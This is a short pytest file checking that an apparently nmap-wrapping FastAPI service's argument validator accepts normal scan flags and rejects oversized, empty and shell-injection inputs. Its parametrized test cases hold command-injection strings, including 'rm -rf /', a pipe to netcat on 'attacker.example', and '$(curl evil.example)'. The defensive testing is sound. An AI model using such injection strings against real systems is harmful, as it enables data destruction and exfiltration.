import sys
from pathlib import Path

import pytest
from fastapi import HTTPException

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from main import MAX_ARG_LENGTH, _validate_args  # noqa: E402


def test_validate_args_accepts_normal_flags():
    _validate_args(["-sT", "-p", "80,443", "scanme.nmap.org"])


@pytest.mark.parametrize(
    "bad_arg",
    [
        "target; rm -rf /",
        "target && whoami",
        "target | nc attacker.example 4444",
        "$(curl evil.example)",
        "target`whoami`",
        "target\nrm -rf /",
    ],
)
def test_validate_args_rejects_shell_metacharacters(bad_arg):
    with pytest.raises(HTTPException) as exc_info:
        _validate_args([bad_arg])
    assert exc_info.value.status_code == 400


def test_validate_args_rejects_empty_argument():
    with pytest.raises(HTTPException):
        _validate_args([""])


def test_validate_args_rejects_oversized_argument():
    with pytest.raises(HTTPException):
        _validate_args(["a" * (MAX_ARG_LENGTH + 1)])
